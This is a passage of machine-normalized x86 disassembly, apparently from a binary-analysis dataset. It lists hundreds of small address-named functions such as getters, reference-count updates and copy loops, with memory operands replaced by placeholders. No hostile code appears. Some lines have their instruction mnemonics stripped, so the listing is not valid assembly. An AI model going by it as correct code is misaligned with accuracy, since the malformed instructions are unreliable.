pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41a403
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_41a414
push ebp
mov ebp esp
push [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ ebp + 0xc ]
call sub_41b03c
pop ebp
retn 0x8
sub_41a42c
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41a441
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41a4a6
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x40 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41a4bb
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_41a4cc
push ebp
mov ebp esp
push [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ ebp + 0xc ]
call sub_41b0f9
pop ebp
retn 0x8
sub_41a4e4
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41a4f9
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41ad3c
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_41ad6a
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_41ad98
push ebx
mov ebx ecx
call sub_416f3f
mov eax ebx
pop ebx
retn
sub_41adc4
push ebx
mov ebx ecx
call sub_416f3f
mov eax ebx
pop ebx
retn
sub_41af1c
retn 0x4
sub_41af77
retn 0x4
sub_41afd8
retn 0x4
sub_41b039
retn 0x4
sub_41b0f6
retn 0x4
sub_41b1b3
push esi
lea esi [ eax + 0x24 ]
call sub_41472b
pop esi
retn
sub_41b1be
push esi
lea esi [ eax + 0x24 ]
call sub_41472b
pop esi
retn
sub_41b2a6
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_41b2b4
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_41b2c2
push ebx
mov ebx ecx
call sub_416f3f
mov eax ebx
pop ebx
retn
sub_41b2ce
push ebx
mov ebx ecx
call sub_416f3f
mov eax ebx
pop ebx
retn
sub_41b2da
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b2ef
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b304
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b319
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b32e
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b343
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b358
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b36d
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b382
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b397
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b3ac
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b409
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b41e
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b433
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b448
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b45d
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b472
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b4f7
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b50c
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
sub_41b521
mov ecx [ ecx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
retn 0x4
xor edx edx
add ecx 0x4
inc edx
[ ecx ] edx
j_sub_41c995
jmp sub_41c995
sub_41b6ff
push edi
mov edi [ eax ]
call sub_407e47
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0x4 ]
pop edi
retn
sub_41b746
cmp [ eax + 0x14 ] 0x10
jb r-xdata
retn
mov eax [ eax ]
sub_41b78d
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
dec ecx
mov [ eax ] ecx
pop ebp
retn
sub_41b88e
retn
sub_41be3e
push ebp
mov ebp esp
push ecx
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41fced
add esp 0xc
leave
retn
sub_41be55
retn
sub_41be56
test eax eax
je r-xdata
retn
mov cx [ ecx ]
mov [ eax ] cx
sub_41be61
retn
j_sub_420542
jmp sub_420542
sub_41c50b
push ebp
mov ebp esp
cmp eax [ ebp + 0x8 ]
je r-xdata
pop ebp
retn
mov cl [ ecx ]
inc eax
cmp eax [ ebp + 0x8 ]
jne r-xdata
cmp [ eax ] cl
je r-xdata
sub_41c521
test eax eax
je r-xdata
retn
mov cx [ ecx ]
mov [ eax ] cx
sub_41c547
retn
sub_41c548
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_41c5a4
retn
sub_41c620
retn
sub_41c6bc
retn
sub_41c6bd
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_41c71b
retn
sub_41c71c
push ebp
mov ebp esp
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_41c969
push esi
lea esi [ eax + 0x24 ]
call sub_41472b
pop esi
retn
sub_41c974
push esi
lea esi [ eax + 0x24 ]
call sub_41472b
pop esi
retn
sub_41c97f
push esi
lea esi [ eax + 0x24 ]
call sub_41472b
pop esi
retn
sub_41c98a
push esi
lea esi [ eax + 0x24 ]
call sub_41472b
pop esi
retn
sub_41ca7d
push ebp
mov ebp esp
mov ecx [ eax + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x2c ]
sub eax [ ecx ]
neg eax
sbb eax eax
inc eax
pop ebp
retn 0x4
sub_41ca94
mov eax [ eax ]
retn
sub_41ca97
mov eax [ eax ]
retn
sub_41ca9a
mov eax [ eax ]
retn
sub_41ca9d
mov eax [ eax ]
retn
sub_41caa0
mov eax [ eax ]
retn
sub_41caa3
mov eax [ eax ]
retn
sub_41caa6
mov eax [ eax ]
retn
sub_41caa9
mov eax [ eax ]
retn
sub_41caac
mov eax [ eax ]
retn
sub_41caaf
mov eax [ eax ]
retn
sub_41cab2
mov eax [ eax ]
retn
sub_41cab5
mov eax [ eax ]
retn
sub_41cab8
mov eax [ eax ]
retn
sub_41cabb
mov eax [ eax ]
retn
sub_41cabe
mov eax [ eax ]
retn
sub_41cac1
mov eax [ eax ]
retn
sub_41cac4
mov eax [ eax ]
retn
sub_41cac7
mov eax [ eax ]
retn
sub_41caca
mov eax [ eax ]
retn
sub_41cacd
mov eax [ eax ]
retn
sub_41cad0
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41caef
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41cb0e
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41cb2d
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41cb4c
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
retn
push 0xa2
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41cb6b
mov [ eax ] ecx
mov cl [ ecx ]
mov [ eax + 0x4 ] cl
retn
sub_41cb73
mov ecx [ eax ]
mov al [ eax + 0x4 ]
mov [ ecx ] al
retn
sub_41cbd7
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x38 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41cc0a
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41e37f
pop ebp
retn 0x8
sub_41cc22
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41cc37
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41cca4
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x38 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41ccd7
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41e3af
pop ebp
retn 0x8
sub_41ccef
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41cd04
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41cd71
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x38 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41cda4
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41e3df
pop ebp
retn 0x8
sub_41cdbc
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41cdd1
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41ce3e
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x38 ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41ce71
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41e40f
pop ebp
retn 0x8
sub_41ce89
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41ce9e
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41cf04
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x1c ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41cf37
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41e43f
pop ebp
retn 0x8
sub_41cf4f
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41cf64
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41cfca
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x1c ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41cfff
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41e46f
pop ebp
retn 0x8
sub_41d017
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41d02c
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41d09f
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x1c ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41d0d2
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41e49f
pop ebp
retn 0x8
sub_41d0ea
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41d0ff
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41d172
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x1c ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41d1a7
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41e4cf
pop ebp
retn 0x8
sub_41d1bf
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41d1d4
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41d247
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x1c ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41d27a
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41e4ff
pop ebp
retn 0x8
sub_41d292
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41d2a7
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41d31a
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x1c ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41d34f
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41e52f
pop ebp
retn 0x8
sub_41d367
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41d37c
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41d3ef
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x1c ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41d422
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41e55f
pop ebp
retn 0x8
sub_41d43a
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41d44f
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41d4c2
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x1c ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41d4f5
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41e58f
pop ebp
retn 0x8
sub_41d50d
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41d522
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41d588
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x1c ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41d5bb
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41e5bf
pop ebp
retn 0x8
sub_41d5d3
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41d5e8
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41d64e
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x1c ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41d681
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41e5ef
pop ebp
retn 0x8
sub_41d699
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41d6ae
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41d714
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x1c ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41d747
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41e61f
pop ebp
retn 0x8
sub_41d75f
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41d774
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41d7da
push ebp
mov ebp esp
push esi
lea esi [ ecx + 0x1c ]
call sub_407e47
mov edx [ eax ]
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_41d80d
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_41e64f
pop ebp
retn 0x8
sub_41d825
mov ecx [ eax ]
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x4
jmp r-xdata
xor edx edx
inc edx
[ ecx ] edx
retn
sub_41d83a
mov eax [ eax ]
test eax eax
je r-xdata
retn
push esi
lea esi [ eax + 0x4 ]
call sub_40c2c3
pop esi
sub_41df53
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_41df61
push esi
push edi
push 0x8
pop ecx
mov esi edx
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_41df6f
push ebx
mov ebx ecx
call sub_416f3f
mov eax ebx
pop ebx
retn
sub_41df7b
push ebx
mov ebx ecx
call sub_416f3f
mov eax ebx
pop ebx
retn
sub_41e2d3
add eax 0x34
retn
sub_41e35e
mov ecx [ ecx + 0x4c ]
imul ecx ecx 0x18
push esi
mov esi [ eax + 0x30 ]
push edi
mov edi [ eax + 0x4 ]
sub edi ecx
add esi 0x4
call sub_41e928
pop edi
pop esi
retn
sub_41e379
mov eax [ eax ]
retn
sub_41e37c
retn 0x4
sub_41e3ac
retn 0x4
sub_41e3dc
retn 0x4
sub_41e40c
retn 0x4
sub_41e43c
retn 0x4
sub_41e46c
retn 0x4
sub_41e49c
retn 0x4
sub_41e4cc
retn 0x4
sub_41e4fc
retn 0x4
sub_41e52c
retn 0x4
sub_41e55c
retn 0x4
sub_41e58c
retn 0x4
sub_41e5bc
retn 0x4
sub_41e5ec
retn 0x4
sub_41e61c
retn 0x4
sub_41e64c
retn 0x4
sub_41e73c
mov eax [ eax ]
retn
sub_41e73f
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41ea14
pop ebp
retn
sub_41e755
mov ecx [ edx ]
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
xor ecx ecx
mov [ eax + 0x8 ] cl
mov [ eax + 0xc ] ecx
mov edx [ edx ]
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] cl
retn
sub_41e891
xor ecx ecx
cmp [ eax + 0x4 ] eax
sete al
retn
sub_41e8dc
cmp [ esi + 0x4 ] esi
jne r-xdata
mov eax [ esi ]
add eax 0x8
retn
push 0xc7
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41e8fe
mov [ eax ] ecx
retn
sub_41e928
cmp edi [ esi + 0x4 ]
jb r-xdata
mov eax esi
call sub_41eac5
jmp sub_41e928
cmp edi [ esi + 0xc ]
jb r-xdata
mov eax [ esi ]
mov [ esi + 0x8 ] edi
mov [ eax + 0x4 ] edi
retn
sub_41e97e
mov ecx [ ecx ]
mov [ eax ] ecx
retn
sub_41e983
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ eax ] ecx
retn
sub_41e98a
retn
sub_41e98b
mov [ eax ] eax
mov [ eax + 0x4 ] eax
retn
sub_41e991
push esi
mov esi ecx
jmp r-xdata
cmp [ esi + 0x4 ] esi
jne r-xdata
mov ecx esi
call sub_41f0d2
pop esi
retn
sub_41e9a4
push ebp
mov ebp esp
pop ebp
jmp sub_41e9c5
sub_41e9fe
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_41ea41
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
retn
sub_41ea49
mov [ eax ] 0x0
retn
sub_41ea4d
cmp [ eax ] 0x0
je r-xdata
retn
mov [ eax ] 0x0
sub_41ea56
mov [ eax ] 0x0
retn
sub_41ea5a
cmp [ eax ] 0x0
je r-xdata
retn
mov [ eax ] 0x0
sub_41ea63
mov [ eax ] eax
mov [ eax + 0x4 ] eax
retn
sub_41ea69
jmp r-xdata
cmp [ esi + 0x4 ] esi
jne r-xdata
mov ecx esi
call sub_41f0d2
retn
sub_41eaad
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_41eab3
and [ eax ] 0x0
retn
sub_41eab7
push esi
mov esi [ eax ]
test esi esi
je r-xdata
pop esi
retn
call sub_4219fb
sub_41eaea
cmp eax [ ecx + 0x4 ]
jb r-xdata
xor eax eax
retn
cmp eax [ ecx + 0xc ]
jae r-xdata
xor eax eax
inc eax
retn
sub_41eb27
mov [ eax ] ecx
retn
sub_41eb2a
retn
sub_41eb2b
mov eax [ eax ]
add eax 0x8
retn
sub_41eb31
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_41eb39
push ebp
mov ebp esp
push [ ebp + 0x8 ]
lea eax [ esi + 0x8 ]
push eax
call sub_41ec98
mov eax esi
pop ebp
retn 0x4
sub_41eb7d
push [ eax + 0x4 ]
call sub_424fc7
pop ecx
retn
sub_41eb87
retn
sub_41ec8b
push ebp
mov ebp esp
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_41edc5
mov [ eax ] 0x0
retn
sub_41edc9
cmp [ eax ] 0x0
je r-xdata
retn
mov [ eax ] 0x0
sub_41edd2
mov [ eax ] 0x0
retn
sub_41edd6
cmp [ eax ] 0x0
je r-xdata
retn
mov [ eax ] 0x0
sub_41eddf
jmp r-xdata
cmp [ esi + 0x4 ] esi
jne r-xdata
mov ecx esi
call sub_41f0d2
retn
sub_41ef09
retn
sub_41ef0a
mov eax [ eax ]
cmp eax [ ecx ]
sbb eax eax
neg eax
retn
sub_41ef13
push ebp
mov ebp esp
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_41f08e
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x8
sub_41ef28
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41f1b2
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x8
sub_41ef3d
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx ]
mov [ eax ] ecx
retn
sub_41ef45
mov ecx [ ecx + 0x4 ]
mov [ eax ] ecx
retn
sub_41efca
retn
sub_41efcb
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_424fc7
pop ecx
pop ebp
retn 0x4
sub_41efdb
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_41f4d6
pop ebp
retn
sub_41efe8
add ecx 0x4
cmp [ ecx ] 0x0
je r-xdata
or eax 0xffffffff
retn
call sub_41f4a8
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor eax eax
retn
sub_41f044
push ebp
mov ebp esp
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x4
sub_41f053
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_41f537
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
j_sub_41f517
jmp sub_41f517
sub_41f06a
cmp [ eax ] 0x0
je r-xdata
retn
mov [ eax ] 0x0
sub_41f073
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
call sub_41f567
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_41f085
cmp [ eax ] 0x0
je r-xdata
retn
mov [ eax ] 0x0
sub_41f15b
mov eax [ ecx + 0x8 ]
sub eax [ ecx ]
push 0x18
cdq
pop ecx
idiv ecx
retn
sub_41f167
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
lea ecx [ eax + 0x14 ]
mov [ ecx ] ecx
mov [ ecx + 0x4 ] ecx
retn
sub_41f180
lea eax [ esi + 0x8 ]
push eax
call sub_41e7c6
push esi
call sub_424fc7
pop ecx
mov eax esi
retn
sub_41f193
mov [ eax ] eax
mov [ eax + 0x4 ] eax
retn
sub_41f199
jmp r-xdata
cmp [ esi + 0x4 ] esi
jne r-xdata
mov ecx esi
call sub_41f0d2
retn
sub_41f1a8
add eax 0x8
push eax
call sub_41e7c6
retn
sub_41f1e9
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ ecx ]
push ecx
push edx
lea esi [ ebp + 0xc ]
